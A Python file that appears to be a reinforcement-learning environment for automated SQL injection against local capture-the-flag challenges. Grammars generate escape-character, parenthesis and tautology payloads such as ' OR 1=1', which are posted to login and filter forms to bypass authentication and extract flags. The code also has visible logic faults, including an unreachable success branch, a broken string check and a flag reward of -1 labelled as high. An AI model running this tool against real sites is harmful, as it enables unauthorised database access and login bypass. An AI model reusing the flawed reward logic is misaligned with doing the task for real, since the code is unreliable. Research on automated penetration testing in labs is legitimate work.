import logging
import os
import random
import re
import time

import gymnasium as gym
import numpy as np
import requests
from dotenv import load_dotenv
from gymnasium import spaces
from nltk import CFG
from nltk.parse.generate import generate
from requests.adapters import HTTPAdapter
from stable_baselines3.common.monitor import Monitor
from urllib3 import Retry

# Load environment variables from .env file
load_dotenv()

NUM_CHALLENGES = int(os.getenv('NUM_CHALLENGES', 1))  # Default to 1 if not set

# Define CFG for identifying valid escape characters
sql_grammar_phase1 = """
S -> ESC COMMENT
ESC -> "'" | '"'
COMMENT -> "-- " | "# " | "/* "
"""

# Define CFG for identifying valid parentheses structure
sql_grammar_phase2 = """
S -> CLOSE_PAREN COMMENT
CLOSE_PAREN -> ")" | "))" | ")))" | "))))" | "))))))"
COMMENT -> "-- " | "# " | "/* "
"""

# Define CFG for injecting SQL statements using identified parentheses structure
sql_grammar_phase3 = """
S -> CLAUSE
CLAUSE -> SIMPLE_CLAUSE | COMPLEX_CLAUSE | PARENTHESIS_CLAUSE | SIMPLE_CLAUSE OPERATION
SIMPLE_CLAUSE -> " OR 1=1" | " AND 1=1" | " OR 'a'='a'" | " AND 'a'='a'" | " OR '1'='1'" | " AND '1'='1'"
COMPLEX_CLAUSE -> PARENTHESIS SIMPLE_CLAUSE PARENTHESIS
PARENTHESIS_CLAUSE -> SIMPLE_CLAUSE " )" | SIMPLE_CLAUSE " ))" | SIMPLE_CLAUSE " )))" | PARENTHESIS COMPLEX_CLAUSE
OPERATION -> " LIMIT " NUMBER " OFFSET " NUMBER | " ORDER BY " COLUMN
PARENTHESIS -> "(" CLAUSE ")" | "(" SIMPLE_CLAUSE ")" | "(" COMPLEX_CLAUSE ")"
NUMBER -> "0" | "1" | "2" | "3" | "4" | "5" | "6" | "7" | "8" | "9"
COLUMN -> "1" | "2" | "3" | "4" | "5"
"""

cfg_phase1 = CFG.fromstring(sql_grammar_phase1)
cfg_phase2 = CFG.fromstring(sql_grammar_phase2)
cfg_phase3 = CFG.fromstring(sql_grammar_phase3)


class SQLiEnv(gym.Env):
    def __init__(self):
        self.base_url = "http://localhost:5959/challenge/"
        self.current_challenge_id = 1
        self.last_payload = ""  # Store the last payload
        self.exploit_char_found = False  # Flag for finding exploit character
        self.exploit_char = ""  # Store the found exploit character
        self.valid_structure = False  # Flag to indicate if the valid structure is found
        self.found_parenthesis_structure = False  # Flag for finding the parenthesis structure
        self.parentheses_structure = ""  # Store the valid parenthesis structure
        self.step_count = 0  # Track the number of steps in the current episode
        self.max_steps_per_episode = 200000  # Maximum steps per episode

        # Define the action and observation spaces
        self.action_space = spaces.Box(low=0, high=1, shape=(22,), dtype=np.float32)
        self.observation_space = spaces.Box(low=0, high=1, shape=(4,), dtype=np.float32)
        # Observation space: [exploit_char_used, query_valid, data_found, flag_found]

        # Set up a session with retries
        self.session = requests.Session()
        retries = Retry(total=5, backoff_factor=0.1)
        self.session.mount("http://", HTTPAdapter(max_retries=retries))

    def generate_payload(self, phase):
        if phase == 1:
            grammar = cfg_phase1
            payload = ' '.join(random.choice(list(generate(grammar, n=10))))
        elif phase == 2:
            grammar = cfg_phase2
            parenthesis_payload = ' '.join(random.choice(list(generate(grammar, n=10))))
            if random.random() < 0.5:
                payload = f"{self.exploit_char} {parenthesis_payload}"
            else:
                payload = f"{self.exploit_char * 2} {parenthesis_payload}"
        else:
            grammar = cfg_phase3
            clause = ' '.join(random.choice(list(generate(grammar, n=10))))
            # Ensure the correct placement of the identified parenthesis structure
            parenthesis_part = self.parentheses_structure
            if len(parenthesis_part) > 0:
                parenthesis_part = parenthesis_part.split(self.exploit_char, 1)
                if len(parenthesis_part) > 1:
                    parenthesis_part = parenthesis_part[1]
                else:
                    parenthesis_part = self.parentheses_structure.split(self.exploit_char * 2, 1)[1]
            # Insert parentheses at various positions
            payload = self.insert_parentheses(clause, parenthesis_part)
        return payload

    def insert_parentheses(self, clause, parentheses):
        # Possible positions for parentheses
        positions = [
            (0, 1),  # Before clause
            (1, 0),  # After clause
            (1, 1),  # Surrounding clause
        ]
        position = random.choice(positions)
        if position == (0, 1):
            payload = f"{self.exploit_char} {parentheses} {clause} {self.comment}"
        elif position == (1, 0):
            payload = f"{self.exploit_char} {clause} {parentheses} {self.comment}"
        elif position == (1, 1):
            # Split parentheses if multiple and insert around the clause
            split_parens = parentheses.split()
            half = len(split_parens) // 2
            prefix = ' '.join(split_parens[:half])
            suffix = ' '.join(split_parens[half:])
            payload = f"{self.exploit_char} {prefix} {clause} {suffix} {self.comment}"
        return payload

    def step(self, action):
        self.step_count += 1  # Increment step count

        # Phase 1: Find the escape character
        if not self.exploit_char_found:
            payload = self.generate_payload(phase=1)
        # Phase 2: Find the valid number of closing parentheses
        elif not self.found_parenthesis_structure:
            payload = self.generate_payload(phase=2)
        # Phase 3: Generate SQL injection payloads with identified structure
        else:
            payload = self.generate_payload(phase=3)

        self.last_payload = payload
        start_time = 0
        end_time = 0
        data = {}
        try:
            response_get = self.session.get(f"{self.base_url}{self.current_challenge_id}", timeout=30)
            if "Login" in response_get.text:
                data = {"username_payload": payload, "password_payload": ""}
            elif "Filter" in response_get.text:
                data = {"payload": payload}

            start_time = time.time()
            response = self.session.post(f"{self.base_url}{self.current_challenge_id}", data=data, timeout=30)
            end_time = time.time()

            state, reward, done, truncated = self.analyze_response(response.text, payload, response.status_code,
                                                                   response_get)
        except (requests.exceptions.ConnectionError, requests.exceptions.Timeout) as e:
            logging.error(f"Connection failed: {e}")
            state, reward, done, truncated = np.zeros(self.observation_space.shape), -1000, False, False

        # Check if episode should be truncated due to reaching the max steps
        if self.step_count >= self.max_steps_per_episode:
            truncated = True

        info = {"response_time": end_time - start_time}

        return np.array(state), reward, done, truncated, info

    def reset(self, **kwargs):
        self.exploit_char_found = False
        self.found_parenthesis_structure = False
        self.valid_structure = False
        self.exploit_char = ""
        self.parentheses_structure = ""
        self.comment = ""
        self.step_count = 0  # Reset step count for new episode
        if NUM_CHALLENGES > 1:
            self.current_challenge_id = (self.current_challenge_id % NUM_CHALLENGES) + 1
        self.session.get("http://localhost:5959/reset")
        return np.zeros(self.observation_space.shape), {}

    def analyze_response(self, response_text, payload, response_status, response_get):
        state, reward = self.set_flags(payload, response_text, response_status, response_get)
        done = state == [1, 1, 1, 1]
        truncated = False
        return state, reward, done, truncated

    def set_flags(self, payload, response_text, response_status, response_get):
        flag_pattern = rf"flag_{self.current_challenge_id}\{{[^}}]+}}"
        space = [0, 0, 0, 0]
        # Observation space: [exploit_char_used, query_valid, data_found, flag_found]

        if self.exploit_char in payload or (self.exploit_char * 2) in payload:
            space[0] = 1  # Exploit character used somewhere in the payload

        if response_status == 200:
            space[1] = 1  # Query is valid
            if not self.found_parenthesis_structure:
                self.found_parenthesis_structure = True
                if self.exploit_char in payload:
                    self.parentheses_structure = payload.split(self.exploit_char, 1)[1]
                elif (self.exploit_char * 2) in payload:
                    self.parentheses_structure = payload.split(self.exploit_char * 2, 1)[1]
                self.comment = payload.split(self.exploit_char, 1)[0]
                print(f"Valid parenthesis structure found: {self.parentheses_structure}")

        # Successful bypass of the password check
        elif (response_status == 200 and ("wrong" or "fail") not in response_text.lower()
              and len(response_text) != len(response_get.text)):
            space[2] = 1  # Data found

        if re.search(flag_pattern, response_text):
            space[2] = 1  # Data found
            space[3] = 1  # Flag found

        reward = self.set_reward(space, payload)
        return space, reward

    def set_reward(self, space, payload):
        reward = 0

        # Observation space: [exploit_char_used, query_valid, data_found, flag_found]

        if space[0] == 0:
            reward -= 1000  # Penalty for not using the exploit character (very bad)

        if space[1] == 0:
            if not self.exploit_char_found:
                reward -= 20  # Penalty for not finding the exploit character by crashing the server
                self.exploit_char_found = True
                self.exploit_char = payload.split(' ')[0]  # Set the first token as the escape character
                print(f"Exploit character found: {self.exploit_char}")
            else:
                reward -= 60  # Penalty for crashing the server if we already found the exploit character
                # (bad but ok because of the exploration)

        if space[2] == 0:
            reward -= 40  # Penalty for not finding any data (bad)

        if space[3] == 1 and space != [1, 1, 1, 1]:
            reward -= 5  # Small penalty for bypassing password check

        if space == [1, 1, 1, 1]:
            reward = -1  # High reward for finding the flag

        return reward


env = Monitor(SQLiEnv(), "logs", allow_early_resets=True)
